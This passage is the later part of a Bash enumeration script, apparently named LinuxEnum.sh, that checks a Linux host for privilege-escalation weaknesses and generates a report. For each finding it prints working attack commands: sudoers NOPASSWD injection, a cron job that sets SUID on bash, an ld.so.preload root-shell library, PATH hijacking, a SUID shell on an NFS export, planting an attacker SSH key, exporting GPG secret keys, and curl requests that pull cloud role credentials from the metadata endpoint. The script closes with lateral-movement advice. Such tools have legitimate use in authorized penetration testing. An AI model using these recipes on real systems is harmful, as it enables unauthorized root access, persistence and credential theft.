if [ -n "$(printf '%s' "$SUDOERS_WRITABLE" | tr -d '[:space:]')" ]; then
    finding "CRITICAL" "Writable sudo configuration"
    ev "$SUDOERS_WRITABLE"
    cmds <<'EOF'
echo "$(id -un) ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers.d/pwn
sudo -i
EOF
fi

# ---- Cron -----------------------------------------------------------------
CRON_W=""
for f in /etc/crontab /etc/cron.d/* /etc/cron.hourly/* /etc/cron.daily/* /etc/cron.weekly/* /etc/cron.monthly/* /var/spool/cron/crontabs/*; do
    [ -e "$f" ] || continue
    [ -w "$f" ] && CRON_W="$CRON_W$f
"
done
if [ -n "$CRON_W" ]; then
    finding "HIGH" "Writable cron jobs"
    ev "$CRON_W"
    cmds <<'EOF'
echo '* * * * * root chmod +s /bin/bash' >> /etc/cron.d/pwn
# After the next minute:
/bin/bash -p
EOF
fi

# ---- Systemd units --------------------------------------------------------
if [ -n "$UNIT_WRITABLE" ]; then
    finding "HIGH" "Writable systemd unit files"
    ev "$UNIT_WRITABLE"
    cmds <<'EOF'
# Change ExecStart in the writable unit to your payload, then:
systemctl daemon-reload
systemctl restart <unit>
EOF
fi

# ---- ld.so.preload --------------------------------------------------------
if [ -w /etc/ld.so.preload ]; then
    finding "CRITICAL" "/etc/ld.so.preload is writable"
    ev "$(ls -la /etc/ld.so.preload)"
    cmds <<'EOF'
cat > /tmp/preload.c <<'C'
__attribute__((constructor)) void pwn(void) { setuid(0); setgid(0); system("/bin/sh -p"); }
C
gcc -shared -fPIC -o /tmp/preload.so /tmp/preload.c
echo /tmp/preload.so > /etc/ld.so.preload
EOF
fi

# ---- Writable root-owned files --------------------------------------------
if [ -n "$RO_WRITABLE" ]; then
    finding "HIGH" "Writable files owned by root"
    ev "$RO_WRITABLE"
    cmds <<'EOF'
# Only act on paths that root actually executes (scripts, unit files, cron):
ls -la <path>
cp <path> /tmp/orig.bak
# Replace the executable content with your payload, then wait for root to run it.
EOF
fi

# ---- PATH -----------------------------------------------------------------
PATH_W=""
OLD_IFS="$IFS"; IFS=':'
for d in $PATH; do
    [ -z "$d" ] && d="."
    [ -w "$d" ] && PATH_W="$PATH_W$d
"
done
IFS="$OLD_IFS"
if [ -n "$PATH_W" ]; then
    finding "MEDIUM" "Writable directory on PATH"
    ev "$PATH_W"
    cmds <<'EOF'
# Hijack a command that a root-run script calls without an absolute path:
echo "$PATH"
printf '#!/bin/sh\nchmod +s /bin/bash\n' > <writable-dir>/<script-name>
chmod +x <writable-dir>/<script-name>
EOF
fi

# ---- SSH ----------------------------------------------------------------
if [ -n "$SSH_KEYS" ]; then
    finding "HIGH" "Private SSH keys discovered"
    ev "$SSH_KEYS"
    cmds <<'EOF'
chmod 600 <key>
ssh -i <key> <user>@<host> -o StrictHostKeyChecking=no
# Reuse the key across the estate where authorized.
EOF
fi

for f in ~/.ssh/authorized_keys /root/.ssh/authorized_keys; do
    if [ -w "$f" ]; then
        finding "HIGH" "authorized_keys is writable: $f"
        ev "$(ls -la "$f")"
        cmds <<'EOF'
echo 'ssh-ed25519 AAAA... attacker-key' >> <authorized_keys>
EOF
    fi
done

if [ -n "$SSH_AUTH_SOCK" ] && ssh-add -l >/dev/null 2>&1; then
    finding "MEDIUM" "SSH agent with loaded keys"
    ev "$(ssh-add -l 2>&1)"
    cmds <<'EOF'
ssh-add -l
ssh -A <user>@<host>
EOF
fi

# ---- Cloud credentials / IMDS ---------------------------------------------
CLOUD_FILES=""
for f in ~/.aws/credentials ~/.aws/config ~/.config/gcloud/application_default_credentials.json \
         ~/.azure/accessTokens.json ~/.docker/config.json ~/.npmrc ~/.netrc ~/.git-credentials \
         ~/.pgpass ~/.my.cnf ~/.terraform.d/credentials.tfrc.json; do
    [ -f "$f" ] && CLOUD_FILES="$CLOUD_FILES$f
"
done
if [ -n "$CLOUD_FILES" ] || [ "${IMDS_HIT:-0}" = "1" ]; then
    finding "HIGH" "Cloud credentials or instance metadata"
    EVID="$CLOUD_FILES"
    [ "${IMDS_HIT:-0}" = "1" ] && EVID="${EVID}IMDS metadata endpoint reachable
"
    ev "$EVID"
    cmds <<'EOF'
aws sts get-caller-identity
aws s3 ls
gcloud auth list
az account show
# IMDS role credentials (AWS):
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/
EOF
fi

# ---- NFS ----------------------------------------------------------------
if [ -r /etc/exports ] && grep -q 'no_root_squash' /etc/exports; then
    finding "HIGH" "NFS export with no_root_squash"
    ev "$(grep 'no_root_squash' /etc/exports)"
    cmds <<'EOF'
# From a host that can mount the export:
cat > /tmp/shell.c <<'C'
#include <unistd.h>
int main(void) { setuid(0); setgid(0); execl("/bin/sh", "sh", 0); }
C
gcc -o /tmp/shell /tmp/shell.c && chmod +s /tmp/shell
# Copy /tmp/shell onto the export, then execute it on the target.
EOF
fi

# ---- GPG ----------------------------------------------------------------
GPG_KEYS=$(gpg --list-secret-keys 2>/dev/null)
if [ -n "$GPG_KEYS" ]; then
    finding "MEDIUM" "GPG secret keys present"
    ev "$GPG_KEYS"
    cmds <<'EOF'
gpg --export-secret-keys --armor <key-id> > /tmp/key.asc
EOF
fi

# ---- Startup / MOTD scripts ---------------------------------------------
if [ -n "$STARTUP_WRITABLE" ]; then
    finding "MEDIUM" "Writable startup / MOTD scripts"
    ev "$STARTUP_WRITABLE"
    cmds <<'EOF'
# profile.d runs for root at login; update-motd.d runs on SSH login:
echo 'chmod +s /bin/bash' >> /etc/update-motd.d/00-header
# Wait for a root login, then:
/bin/bash -p
EOF
fi

# ---- Kernel / patch level ----------------------------------------------
finding "INFO" "Kernel and patch level"
ev "$(uname -a)
$(grep PRETTY_NAME /etc/os-release 2>/dev/null)"
cmds <<'EOF'
searchsploit "linux kernel $(uname -r)"
./linux-exploit-suggester.sh
EOF

if [ "$FINDINGS_N" -eq 0 ]; then
    out ""
    out "_No automated findings were produced. Review the raw sections above manually._"
fi

out ""
out "### Reference tooling"
out ""
out "- GTFOBins - https://gtfobins.github.io/"
out "- HackTricks - Linux privilege escalation"
out "- linux-exploit-suggester, linpeas, pspy for a second opinion"

# ---------------------------------------------------------------------------
sec "18. Wrap-up / Next Steps"

out ""
out "_The findings above are generated automatically; this checklist covers what to review manually._"
out ""
out "- Check **sudo rights** (`sudo -n -l`) and **SUID/SGID/caps** for known GTFOBins vectors."
out "- Test **writable paths** in PATH, cron files, systemd units, MOTD/profile.d and world-writable dirs."
out "- If in `docker`/`lxd` group or socket is writable, container breakout paths apply."
out "- If `/etc/passwd` is writable or `/etc/shadow` readable, direct credential attacks apply."
out "- Review **cloud credentials** (`.aws`, `.gcloud`, `.azure`, `.docker`) and the **IMDS** response."
out "- Cross-reference **kernel version** and **mitigation settings** against known exploits."
out "- Review **history files**, **.env**, **backup files**, **VPN configs** and **authorized_keys** for stored credentials."
out "- Use **logged-in sessions**, **SSH agent** and **reused keys** to plan lateral movement."
out "- Escalate through **writable cron/systemd units**, **writable root-owned files** and **NFS exports**."
out ""
out "---"
out "_Report generated by LinuxEnum.sh_"

echo ""
echo "[+] Report written to: $(pwd)/$OUT"
